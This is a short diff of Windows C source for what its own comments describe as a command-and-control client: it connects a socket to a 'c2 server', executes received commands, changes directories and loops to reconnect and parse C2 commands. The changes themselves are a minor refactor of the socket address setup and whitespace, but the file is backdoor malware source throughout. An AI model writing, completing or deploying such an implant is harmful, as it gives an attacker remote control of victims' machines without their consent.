@@ -34,14 +34,14 @@ const SOCKET create_socket() {
 
 // Function to connect the connect socket to c2 server.
 int c2_connect(const SOCKET connect_socket) {
-	// Create hint structure.
-	struct sockaddr_in hint;
-	hint.sin_family = AF_INET;
-	hint.sin_port = htons(PORT);
-	inet_pton(AF_INET, HOST, &hint.sin_addr);
+	// Create sokaddr_in structure.
+	struct sockaddr_in s_in;
+	s_in.sin_family = AF_INET;
+	s_in.sin_addr.s_addr = inet_addr(HOST);
+	s_in.sin_port = htons(PORT);
 
 	// Connect to server hosting c2 service
-	if (connect(connect_socket, (struct sockaddr*)&hint, sizeof(hint)) == SOCKET_ERROR) {
+	if (connect(connect_socket, (SOCKADDR*)&s_in, sizeof(s_in)) == SOCKET_ERROR) {
 		closesocket(connect_socket);
 		return SOCKET_ERROR;
 	}
@@ -63,6 +63,7 @@ BOOL exec_cmd(const SOCKET connect_socket, char* const buf) {
 
 int ch_dir(char* const dir, SOCKET connect_socket) {
 	char chdir_result[] = "1";
+	
 	_chdir(dir);
 	if (errno == ENOENT)
 		chdir_result[0] = '0';
@@ -149,7 +150,7 @@ int main(void) {
 
 		/* 
 		If connected to c2 recursively loop to receive/parse c2 commands. If an error-
-	    	occurs (connection lost, etc) break the loop and reconnect & restart loop. The switch-
+	    occurs (connection lost, etc) break the loop and reconnect & restart loop. The switch-
 		statement will parse & execute functions based on the order of probability.
 		*/
 		if (connect_socket != INVALID_SOCKET) {
